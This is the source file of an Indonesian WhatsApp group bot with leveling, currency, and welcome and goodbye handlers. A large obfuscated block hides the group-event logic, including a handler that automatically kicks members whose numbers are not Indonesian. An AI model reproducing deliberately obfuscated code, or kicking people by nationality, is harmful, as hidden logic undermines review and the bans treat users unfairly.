// mau nylong case ya om? pftt :v
// recode sc ramlan
// by dcode-denpa
// bagian encrypt jangan dihapus tar emror
// klo mau up yt kasih nama gw/link ch gw
// thx to nya jan dihapus
const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   ChatModification,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
   Browser
} = require("@adiwajshing/baileys")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const speed = require('performance-now')
const base64Img = require('base64-img')
const toMs = require('ms')
const got = require("got")
const util = require('util')
const ms = require('parse-ms')
const ytdl = require('ytdl-core')
const imgbb = require('imgbb-uploader')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const { exec } = require("child_process")
const fetch = require('node-fetch')
const request = require('request')
const crypto = require('crypto')
const axios = require('axios')
const qrcodes = require("qrcode")
const qrcode = require("qrcode-terminal")
const os = require('os')
const ID3Writer = require('browser-id3-writer')
const ytsr = require('ytsr')
const yts = require( 'yt-search')
const cheerio = require('cheerio')
const { Utils_1 } = require('./node_modules/@adiwajshing/baileys/lib/WAConnection/Utils')
const FormData = require('form-data')
const fs = require("fs")
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const tik = require('tiktok-scraper-without-watermark')
const { recognize } = require('./lib/ocr')
const { removeBackgroundFromImageFile } = require('remove.bg')
const { ytplay, ytdldown } = require('./lib/ytdownload')
const { fetchJson } = require('./lib/fetcher')
const { dla } = require('./language')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { uploadimg } = require('./lib/uploadimg')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const setting = JSON.parse(fs.readFileSync('./dns/setting.json'))
const {
	color,
	bgcolor
} = require('./lib/color')
const {
	simih,
	getBuffer,
	getGroupAdmins,
	getRandom,
	banner,
	start,
	info,
	success,
	close
} = require('./lib/functions')
//Load Json

/*
SETTINGS
*/
botName = setting.botName
ytName = setting.ytName
igName = setting.igName
grupLink = setting.grupLink
igLink = setting.igLink
ytLink = setting.ytLink
ownerName = setting.ownerName
kontakName = setting.kontakName
kontakORG = setting.kontakORG
vhtear = setting.vhtear
xteam = setting.xteam
limitawal = setting.limitawal
memberlimit = setting.memberlimit
cr = setting.cr
const owner = setting.owner
blocked = []
self = true
kuis = false
no = 1
prefix = '#'
numbernye = '0'
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${kontakName}\n`
            + `ORG:${kontakORG};\n`
            + `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
            + 'END:VCARD'
/*
SETTINGS
*/
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/leveling.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
const event = JSON.parse(fs.readFileSync('./database/event.json'))
const ban = JSON.parse(fs.readFileSync('./database/banned.json'))
const _samih = JSON.parse(fs.readFileSync('./database/simi.json'))
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const _level = JSON.parse(fs.readFileSync('./database/level.json'))
const uang = JSON.parse(fs.readFileSync('./database/uang.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
const _limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const audioya = JSON.parse(fs.readFileSync('./media/audio.json'))
const imegya = JSON.parse(fs.readFileSync('./media/image.json'))
const setimker = JSON.parse(fs.readFileSync('./media/stik.json'))
const vidioya = JSON.parse(fs.readFileSync('./media/video.json'))
// End Json
const getLevelingXp = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].xp
	}
}

const getLevelingLevel = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].level
	}
}

const getLevelingId = (sender) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return _level[position].id
	}
}

const addLevelingXp = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].xp += amount
		fs.writeFileSync('./database/level.json', JSON.stringify(_level))
	}
}

const addLevelingLevel = (sender, amount) => {
	let position = false
	Object.keys(_level).forEach((i) => {
		if (_level[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_level[position].level += amount
		fs.writeFileSync('./database/level.json', JSON.stringify(_level))
	}
}

const addLevelingId = (sender) => {
	const obj = { id: sender, xp: 1, level: 1 }
	_level.push(obj)
	fs.writeFileSync('./database/level.json', JSON.stringify(_level))
}

const getRegisteredRandomId = () => {
	return _registered[Math.floor(Math.random() * _registered.length)].id
}

const addRegisteredUser = (userid, sender, time, serials) => {
	const obj = { id: userid, name: sender, time: time, serial: serials }
	_registered.push(obj)
	fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}

const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const checkRegisteredUser = (sender) => {
	let status = false
	Object.keys(_registered).forEach((i) => {
		if (_registered[i].id === sender) {
			status = true
		}
	})
	return status
}

const addATM = (sender) => {
	const obj = { id: sender, uang: 5 }
	uang.push(obj)
	fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
}

const addKoinUser = (sender, amount) => {
	let position = false
	Object.keys(uang).forEach((i) => {
		if (uang[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		uang[position].uang += amount
		fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
	}
}

const checkATMuser = (sender) => {
	let position = false
	Object.keys(uang).forEach((i) => {
		if (uang[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		return uang[position].uang
	}
}

const bayarLimit = (sender, amount) => {
	let position = false
	Object.keys(_limit).forEach((i) => {
		if (_limit[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		_limit[position].limit -= amount
		fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
	}
}

const confirmATM = (sender, amount) => {
	let position = false
	Object.keys(uang).forEach((i) => {
		if (uang[i].id === sender) {
			position = i
		}
	})
	if (position !== false) {
		uang[position].uang -= amount
		fs.writeFileSync('./database/uang.json', JSON.stringify(uang))
	}
}

const limitAdd = (sender) => {
	let position = false
	Object.keys(_limit).forEach((i) => {
		if (_limit[i].id == sender) {
			position = i
		}
	})
	if (position !== false) {
		_limit[position].limit += 1
		fs.writeFileSync('./database/limit.json', JSON.stringify(_limit))
	}
}

//finction
const jam = moment.tz('Asia/Jakarta').format('HH:mm')
const arrayBulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']

const bulan = arrayBulan[moment().format('MM') - 1]
const time_now = moment().format('HH:mm:')
function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`
let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
				var penghitungRmd = 0
			if (moment().format('MM') == 03) {
				penghitungRmd = 44
			} else if (moment().format('MM') == 04) {
				penghitungRmd = 14
			}
			let v = new Date
				let localle = 'id'
					const harinya = d.toLocaleDateString(locale, { weekday: 'long' })
				
				var ramadhan = Math.floor(penghitungRmd - moment().format('DD:HH:mm')) 
				let hri = new Date
				let localev = 'id'
					var hari= hri.toLocaleDateString(localev, { weekday: 'long' })
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
// SLEEP 
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const dnsnew = fs.readFileSync('./dns/dnsnew.jpg')
async function starts() {
	const dila = new WAConnection()
	dila.logger.level = 'warn'
	console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Assalamualaikum kak, Namaku Dila', 'yellow'), color('(😜)', 'white'))
	dila.on('qr', () => {
		console.log(color('[', 'white'), color('!', 'red'), color(']', 'white'), color('Scan QRnya', 'yellow'))
	})
	dila.on('credentials-updated', () => {
		fs.writeFileSync('./QRnya.json', JSON.stringify(dila.base64EncodedAuthInfo(), null, '\t'))
		info('2','Geeting Info')
	})
	fs.existsSync('./QRnya.json') && dila.loadAuthInfo('./QRnya.json')
	dila.on('connecting', () => {
		start('2','Connecting')
	})
	dila.on('open', () => {
		success('2','Connected')
		console.log(banner.string)
		console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Kalo ada bug langsung lapor ke Owner ya kak', 'yellow'), color('(😊)', 'white'))
	})
	await dila.connect({ timeoutMs: 30 * 1000 })
	var _0x5d5d=['Dgv4Da','z2v0wwvHCG','sNvSAq','mtG0ota5ognqywTrrq','ygbGvhvYDw4GsMfIyxrHBIbeAsbhCNvWia','ygbGqa','xWPFs2f0ysblyxrHifrLCMfRAgLYidOG','kpcFPjqP','Bg9N','twvP','qxbYAwW','ygbGcGPGygdILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILibGygaGicaGicaGiaOkygbGtMfTysa6iea','mtq3mJy5uKzPu1bZ','ygbGcMbGyejPBYa6ia','rMvICNvHCMK','Aw1Hz2u','t2T0B2jLCG','u1Ltvevn','pZ/WN4+7xWRILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILiakx01LBMLUz2DHBcbqywrHidOG','sMfUDwfYAq','z2v0rgf5','z2v0tNvTyMvY','y29UDgfJDhm','nJG1mte5rLPPBNvc','ygbGcGPGygbuyw5Nz2fSidOG','C3rHDhvZ','tM92zw1Izxi','BgvUz3rO','ndK0odzQwuXXv3a','z3jVDxbszw1VDMu','qgmUDxm','ywrK','ic0G','ygbGcUkuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGokuGaPGygboyw1HidOGqa','u2vUAw4','CMvWBgfJzq','z2v0rgf0zq','u2vSyxnH','z3jVDxaTCgfYDgLJAxbHBNrZlxvWzgf0zq','rgvZzw1Izxi','DM5HBwu','BM90Awz5','y3LHBG','C3bSAxq','ygbGtMfPAYbkywjHDgfUierPieDYDxaG','x1nLBgfTyxqGsMfSyw4Gqa','jM1LBwnVDw50pq','jMrLC2nYAw1PBMf0B3i9','CMvTB3zL','Ahr0Chm6lY9Jzg4UCgL4ywjHEs5JB20VCgHVDg8VmJaXns8Xmc8Wns8YmI8ZnY9IBgfUAY1WCM9MAwXLlxbPy3r1CMuTotCZndyWxZK2mf83mJaUCg5Np3e9nJa','ygbGcMbGye1LBwjLCIblzsa6ia','z2v0uhjVzMLSzvbPy3r1CMu','jMDJBMfTzt0','qwrHigj1BguGBwfZDwSGz3j1Ccb0DwGGA2fRlcbeAwXHigTPy2SGEweGA2fR','ygbGcGPGygdILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILibGygakcMbGyenVBMDYyxrZiseHygbG','qhmUD2HHDhnHChaUBMv0','z2v0tw9UDgG','ygbGv2vSy29TzsbjBIbhyYa','Ahr0CdOVl2HHzgKTyxbPlMHLCM9RDwfWCc5JB20VyxbPl2nHCMqVz29Vzgj5zt9Uyw1Hpq','icWGu29YCNKGDgHPCYbhCM91CcbPCYbVBMX5igzVCIbjBMrVBMvZAwfUC2bGya','mZjty1vxvLu','u2vWDgvTyMvY','wwfUzYbRzwX1yxiGC2LHCgeGEweGA2fRpW','uMfIDq','ndq4mteWr0rps3bw','mJa1mtn6su5rzxa','mtnRB3PsCfC','twfYzxq','nty0t3v0yuDd','ywn0Aw9U','sNvUAq','AMLK','Aw5JBhvKzxm','C3vIAMvJDa','qwrHihLNigPHzgKGywrTAw4GDhvOigTHAYbZAwfWysb5ysbRywS/','s2fTAxm','C2vUze1LC3nHz2u','EwvSBg93','twLUz2D1','z3jVDxbnzxrHzgf0yq','qwD1C3r1CW','CgfYDgLJAxbHBNrZ','jMjNpq','mta5B1znBxLo','D2HPDgu','ygbGcGPGygbcAw8GoIa','u2fIDhu','Aw50zxjUyxrPB25HBa','sNvTyxq','ygbGcGPGygdILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILidILibGygakcMbGye1HA2fUBNLHiePHzgKGqwrTAw4GsMfUz2fUiejHCgvYyw46DMbGya','Ahr0Chm6lY9Pmc53Cc5JB20VD3D3lMDHBwjHCNvUAwSUAwqVD3aTy29UDgvUDc91CgXVywrZlZiWmtKVmdyVvg9WluDHBwjHCI1gB3rVlvbYB2zPBc1lB3nVBMCTthvJDs1uzxjNB2TPBc0UANbN'];function _0xd63c(_0x163291,_0x302eb4){_0x163291=_0x163291-0x193;var _0x5d5d7b=_0x5d5d[_0x163291];if(_0xd63c['pnhDwq']===undefined){var _0xd63cab=function(_0x2f03e5){var _0x148844='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x582ebd='';for(var _0x539623=0x0,_0x1b31b5,_0x48823e,_0x27c9bf=0x0;_0x48823e=_0x2f03e5['charAt'](_0x27c9bf++);~_0x48823e&&(_0x1b31b5=_0x539623%0x4?_0x1b31b5*0x40+_0x48823e:_0x48823e,_0x539623++%0x4)?_0x582ebd+=String['fromCharCode'](0xff&_0x1b31b5>>(-0x2*_0x539623&0x6)):0x0){_0x48823e=_0x148844['indexOf'](_0x48823e);}return _0x582ebd;};_0xd63c['hUZuru']=function(_0x2e97c5){var _0x5eeb9a=_0xd63cab(_0x2e97c5);var _0x3af7ed=[];for(var _0x4e9041=0x0,_0x4a06fa=_0x5eeb9a['length'];_0x4e9041<_0x4a06fa;_0x4e9041++){_0x3af7ed+='%'+('00'+_0x5eeb9a['charCodeAt'](_0x4e9041)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3af7ed);},_0xd63c['deXukK']={},_0xd63c['pnhDwq']=!![];}var _0x562961=_0x5d5d[0x0],_0x2c8787=_0x163291+_0x562961,_0xbe8ecb=_0xd63c['deXukK'][_0x2c8787];return _0xbe8ecb===undefined?(_0x5d5d7b=_0xd63c['hUZuru'](_0x5d5d7b),_0xd63c['deXukK'][_0x2c8787]=_0x5d5d7b):_0x5d5d7b=_0xbe8ecb,_0x5d5d7b;}var _0x164752=_0xd63c;(function(_0x3d55ec,_0x430348){var _0x2be423=_0xd63c;while(!![]){try{var _0x11e8b4=parseInt(_0x2be423(0x1e6))+-parseInt(_0x2be423(0x1c1))*parseInt(_0x2be423(0x19b))+-parseInt(_0x2be423(0x1c0))*parseInt(_0x2be423(0x1bb))+-parseInt(_0x2be423(0x1c3))*parseInt(_0x2be423(0x1d2))+parseInt(_0x2be423(0x1bf))+-parseInt(_0x2be423(0x196))+parseInt(_0x2be423(0x1dd));if(_0x11e8b4===_0x430348)break;else _0x3d55ec['push'](_0x3d55ec['shift']());}catch(_0x4ed7ad){_0x3d55ec['push'](_0x3d55ec['shift']());}}}(_0x5d5d,0x61344),dila['on']('group-participants-update',async _0x562961=>{var _0x21bf7b=_0xd63c;if(!welkom[_0x21bf7b(0x1c7)](_0x562961[_0x21bf7b(0x1c6)]))return;try{console[_0x21bf7b(0x1e2)](_0x562961);const _0x48823e=_0x562961[_0x21bf7b(0x1d0)][0x0],_0x27c9bf=await dila[_0x21bf7b(0x1ce)](_0x562961['jid']),_0x2e97c5=dila[_0x21bf7b(0x195)][_0x48823e]!=undefined?dila[_0x21bf7b(0x195)][_0x48823e][_0x21bf7b(0x1a8)]=undefined?PhoneNumber('+'+_0x48823e['replace'](_0x21bf7b(0x1b6),''))[_0x21bf7b(0x194)](_0x21bf7b(0x1d6)):dila[_0x21bf7b(0x195)][_0x48823e][_0x21bf7b(0x1a8)]||dila['contacts'][_0x48823e][_0x21bf7b(0x1a7)]:PhoneNumber('+'+_0x48823e[_0x21bf7b(0x1a2)](_0x21bf7b(0x1b6),''))[_0x21bf7b(0x194)]('international'),_0x5eeb9a=_0x562961['participants'][0x0],_0x3af7ed=await dila['getStatus'](_0x562961[_0x21bf7b(0x1d0)][0x0],MessageType[_0x21bf7b(0x1da)]);try{var _0x2c8787=await dila[_0x21bf7b(0x1b2)](_0x562961[_0x21bf7b(0x1d0)][0x0][_0x21bf7b(0x1aa)]('@')[0x0]+_0x21bf7b(0x19d));}catch(_0x4e9041){var _0x2c8787=_0x21bf7b(0x1b0);}if(_0x562961[_0x21bf7b(0x1c4)]==_0x21bf7b(0x19e)){myMonths=[_0x21bf7b(0x1ed),'Februari',_0x21bf7b(0x1c2),_0x21bf7b(0x1e4),_0x21bf7b(0x1e3),'Juni',_0x21bf7b(0x1dc),_0x21bf7b(0x1cf),_0x21bf7b(0x1bc),'Oktober',_0x21bf7b(0x199),'Desember'],myDays=[_0x21bf7b(0x1cd),_0x21bf7b(0x1a1),'Selasa','Rabu',_0x21bf7b(0x1ca),'Jumat','Sabtu'];var _0xbe8ecb=new Date(),_0x2f03e5=_0xbe8ecb[_0x21bf7b(0x1a3)](),_0x148844=_0xbe8ecb[_0x21bf7b(0x1b7)](),_0x582ebd=_0xbe8ecb['getDay'](),_0x582ebd=myDays[_0x582ebd],_0x539623=_0xbe8ecb[_0x21bf7b(0x1db)](),_0x1b31b5=_0x539623<0x3e8?_0x539623+0x76c:_0x539623;const _0x4a06fa=_0x582ebd+',\x20'+_0x2f03e5+_0x21bf7b(0x19f)+myMonths[_0x148844]+_0x21bf7b(0x19f)+_0x1b31b5;membr=_0x27c9bf[_0x21bf7b(0x1d0)][_0x21bf7b(0x19a)],console[_0x21bf7b(0x1e2)](color('[','white'),color('SYSTEM',_0x21bf7b(0x1a9)),color(']',_0x21bf7b(0x1d3)),color('Ada\x20orang\x20masuk\x20grup\x20tuh\x20kak,\x20Siapa\x20ya\x20kak?',_0x21bf7b(0x1cc)),color('(🤔)',_0x21bf7b(0x1d3))),memeg=_0x27c9bf[_0x21bf7b(0x1d0)][_0x21bf7b(0x19a)],anu_user=dila[_0x21bf7b(0x195)][_0x5eeb9a],teks=_0x21bf7b(0x1b8)+_0x27c9bf[_0x21bf7b(0x1c8)]+_0x21bf7b(0x1a0)+_0x48823e[_0x21bf7b(0x1aa)]('@')[0x0]+_0x21bf7b(0x1e7)+_0x3af7ed[_0x21bf7b(0x198)]+_0x21bf7b(0x1b1)+membr+'```\x0a```Tanggal\x20:\x20'+_0x4a06fa+'```\x0a```Jangan\x20Lupa\x20Baca\x20Deskripsi```\x0a─────────────────\x0a'+_0x27c9bf['desc'];let _0x1f4467=await getBuffer('http://hadi-api.herokuapp.com/api/card/welcome?nama='+encodeURIComponent(_0x2e97c5)+_0x21bf7b(0x1ae)+memeg+'&memcount='+memeg+_0x21bf7b(0x1b3)+encodeURI(_0x27c9bf[_0x21bf7b(0x1c8)])+'&pp='+_0x2c8787+_0x21bf7b(0x1d1)+_0x2c8787);dila[_0x21bf7b(0x1cb)](_0x27c9bf['id'],_0x1f4467,MessageType[_0x21bf7b(0x1e9)],{'caption':teks,'contextInfo':{'mentionedJid':[_0x48823e]}});}if(_0x562961['action']==_0x21bf7b(0x1af)){console[_0x21bf7b(0x1e2)](color('[','white'),color('SYSTEM',_0x21bf7b(0x1a9)),color(']',_0x21bf7b(0x1d3)),color(_0x21bf7b(0x1bd),_0x21bf7b(0x1cc)),color('(🤔)','white')),myMonths=['Januari',_0x21bf7b(0x1e8),'Maret',_0x21bf7b(0x1e4),'Mei','Juni','Juli','Agustus',_0x21bf7b(0x1bc),_0x21bf7b(0x1ea),_0x21bf7b(0x199),_0x21bf7b(0x1a6)],myDays=[_0x21bf7b(0x1cd),_0x21bf7b(0x1a1),_0x21bf7b(0x1a4),_0x21bf7b(0x1be),_0x21bf7b(0x1ca),_0x21bf7b(0x1d7),_0x21bf7b(0x1d5)];var _0xbe8ecb=new Date(),_0x2f03e5=_0xbe8ecb['getDate'](),_0x148844=_0xbe8ecb[_0x21bf7b(0x1b7)](),_0x582ebd=_0xbe8ecb['getDay'](),_0x582ebd=myDays[_0x582ebd],_0x539623=_0xbe8ecb[_0x21bf7b(0x1db)](),_0x1b31b5=_0x539623<0x3e8?_0x539623+0x76c:_0x539623;const _0x450fc0=_0x582ebd+',\x20'+_0x2f03e5+_0x21bf7b(0x19f)+myMonths[_0x148844]+_0x21bf7b(0x19f)+_0x1b31b5;anu_user=dila[_0x21bf7b(0x195)][_0x5eeb9a],memeg=_0x27c9bf[_0x21bf7b(0x1d0)][_0x21bf7b(0x19a)],out=_0x21bf7b(0x1ac)+_0x48823e[_0x21bf7b(0x1aa)]('@')[0x0]+_0x21bf7b(0x1ec)+_0x450fc0+_0x21bf7b(0x1e0)+_0x3af7ed['status']+'_';let _0x26ee0d=await getBuffer(_0x21bf7b(0x1b9)+encodeURIComponent(_0x2e97c5)+_0x21bf7b(0x1ae)+memeg+_0x21bf7b(0x1ad)+memeg+'&gcname='+encodeURI(_0x27c9bf[_0x21bf7b(0x1c8)])+'&pp='+_0x2c8787+_0x21bf7b(0x1d1)+_0x2c8787);dila[_0x21bf7b(0x1cb)](_0x27c9bf['id'],_0x26ee0d,MessageType[_0x21bf7b(0x1e9)],{'caption':out,'contextInfo':{'mentionedJid':[_0x48823e]}});}else{if(_0x562961[_0x21bf7b(0x1c4)]=='promote'){const _0x33bb3b=await dila['groupMetadata'](_0x562961['jid']);console[_0x21bf7b(0x1e2)](color('[',_0x21bf7b(0x1d3)),color('SYSTEM',_0x21bf7b(0x1a9)),color(']',_0x21bf7b(0x1d3)),color(_0x21bf7b(0x1c9),_0x21bf7b(0x1cc)),color(_0x21bf7b(0x1e1),'white')),myMonths=[_0x21bf7b(0x1ed),_0x21bf7b(0x1e8),'Maret','April',_0x21bf7b(0x1e3),_0x21bf7b(0x1c5),_0x21bf7b(0x1dc),'Agustus',_0x21bf7b(0x1bc),_0x21bf7b(0x1ea),_0x21bf7b(0x199),_0x21bf7b(0x1a6)],myDays=['Minggu','Senin',_0x21bf7b(0x1a4),_0x21bf7b(0x1be),'Kamis','Jumat',_0x21bf7b(0x1d5)];var _0xbe8ecb=new Date(),_0x2f03e5=_0xbe8ecb[_0x21bf7b(0x1a3)](),_0x148844=_0xbe8ecb[_0x21bf7b(0x1b7)](),_0x582ebd=_0xbe8ecb[_0x21bf7b(0x193)](),_0x582ebd=myDays[_0x582ebd],_0x539623=_0xbe8ecb[_0x21bf7b(0x1db)](),_0x1b31b5=_0x539623<0x3e8?_0x539623+0x76c:_0x539623;const _0x3f22fc=_0x582ebd+',\x20'+_0x2f03e5+_0x21bf7b(0x19f)+myMonths[_0x148844]+_0x21bf7b(0x19f)+_0x1b31b5;_0x48823e=_0x562961[_0x21bf7b(0x1d0)][0x0],anu_user=dila[_0x21bf7b(0x195)][_0x5eeb9a],memeg=_0x33bb3b['participants'][_0x21bf7b(0x19a)];try{ppimg=await dila[_0x21bf7b(0x1b2)](_0x562961[_0x21bf7b(0x1d0)][0x0]['split']('@')[0x0]+_0x21bf7b(0x19d));}catch{ppimg=_0x21bf7b(0x1d9);}let _0x45da11=await getBuffer(ppimg);teks=_0x21bf7b(0x1ab)+_0x33bb3b[_0x21bf7b(0x1c8)]+'```\x0a\x0a```─────────────────```\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x0a```Nama\x20:\x20@'+_0x48823e[_0x21bf7b(0x1aa)]('@')[0x0]+_0x21bf7b(0x1d4)+_0x3af7ed['status']+_0x21bf7b(0x197)+_0x3f22fc+_0x21bf7b(0x1b5),dila[_0x21bf7b(0x1cb)](_0x33bb3b['id'],_0x45da11,MessageType[_0x21bf7b(0x1e9)],{'caption':teks,'contextInfo':{'mentionedJid':[_0x48823e]}});}else{if(_0x562961[_0x21bf7b(0x1c4)]=='demote'){console[_0x21bf7b(0x1e2)](color('[',_0x21bf7b(0x1d3)),color(_0x21bf7b(0x1eb),_0x21bf7b(0x1a9)),color(']','white'),color('Ada\x20yg\x20di\x20unadmin\x20tuh\x20kak\x20siapa\x20ya\x20kak?',_0x21bf7b(0x1cc)),color(_0x21bf7b(0x1e1),_0x21bf7b(0x1d3))),myMonths=[_0x21bf7b(0x1ed),_0x21bf7b(0x1e8),'Maret',_0x21bf7b(0x1e4),_0x21bf7b(0x1e3),_0x21bf7b(0x1c5),'Juli','Agustus',_0x21bf7b(0x1bc),_0x21bf7b(0x1ea),'November',_0x21bf7b(0x1a6)],myDays=[_0x21bf7b(0x1cd),_0x21bf7b(0x1a1),_0x21bf7b(0x1a4),_0x21bf7b(0x1be),_0x21bf7b(0x1ca),'Jumat',_0x21bf7b(0x1d5)];var _0xbe8ecb=new Date(),_0x2f03e5=_0xbe8ecb[_0x21bf7b(0x1a3)](),_0x148844=_0xbe8ecb[_0x21bf7b(0x1b7)](),_0x582ebd=_0xbe8ecb[_0x21bf7b(0x193)](),_0x582ebd=myDays[_0x582ebd],_0x539623=_0xbe8ecb[_0x21bf7b(0x1db)](),_0x1b31b5=_0x539623<0x3e8?_0x539623+0x76c:_0x539623;const _0x498f18=_0x582ebd+',\x20'+_0x2f03e5+_0x21bf7b(0x19f)+myMonths[_0x148844]+'\x20-\x20'+_0x1b31b5;_0x48823e=_0x562961[_0x21bf7b(0x1d0)][0x0],anu_user=dila[_0x21bf7b(0x195)][_0x5eeb9a],memeg=_0x27c9bf[_0x21bf7b(0x1d0)][_0x21bf7b(0x19a)];try{ppimg=await dila['getProfilePicture'](_0x562961[_0x21bf7b(0x1d0)][0x0][_0x21bf7b(0x1aa)]('@')[0x0]+_0x21bf7b(0x19d));}catch{ppimg=_0x21bf7b(0x1d9);}let _0x4ce615=await getBuffer(ppimg);teks=_0x21bf7b(0x1de)+_0x27c9bf[_0x21bf7b(0x1c8)]+_0x21bf7b(0x1e5)+_0x48823e[_0x21bf7b(0x1aa)]('@')[0x0]+_0x21bf7b(0x1d4)+_0x3af7ed[_0x21bf7b(0x198)]+_0x21bf7b(0x197)+_0x498f18+_0x21bf7b(0x1d8),dila['sendMessage'](_0x27c9bf['id'],_0x4ce615,MessageType['image'],{'caption':teks,'contextInfo':{'mentionedJid':[_0x48823e]}});}}}}catch(_0x293165){console[_0x21bf7b(0x1e2)](_0x293165);}}),dila['on'](_0x164752(0x1a5),async _0x21f1cb=>{var _0x3d0dc8=_0x164752;if(!kickarea[_0x3d0dc8(0x1c7)](_0x21f1cb[_0x3d0dc8(0x1c6)]))return;const _0x59f6e1=await dila['groupMetadata'](_0x21f1cb[_0x3d0dc8(0x1c6)]);console[_0x3d0dc8(0x1e2)](_0x21f1cb),num=_0x21f1cb[_0x3d0dc8(0x1d0)][0x0];if(num[_0x3d0dc8(0x1c7)]('62'))return;bule=''+num[_0x3d0dc8(0x1aa)]('@')[0x0],console[_0x3d0dc8(0x1e2)](color('[',_0x3d0dc8(0x1d3)),color(_0x3d0dc8(0x1eb),_0x3d0dc8(0x1a9)),color(']','white'),color(_0x3d0dc8(0x1b4),'yellow'),color('(😁)','white')),teks=_0x3d0dc8(0x1df)+num[_0x3d0dc8(0x1aa)]('@')[0x0]+_0x3d0dc8(0x1ba),dila['sendMessage'](_0x59f6e1['id'],teks,MessageType[_0x3d0dc8(0x1da)],{'thumbnail':dnsnew,'sendEphemeral':!![],'contextInfo':{'mentionedJid':[num]}}),dila[_0x3d0dc8(0x19c)](_0x21f1cb['jid'],[num]);}));
    dila.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
		for (let i of json[1].blocklist) {
			blocked.push(i.replace('c.us', 's.whatsapp.net'))
		}
	})
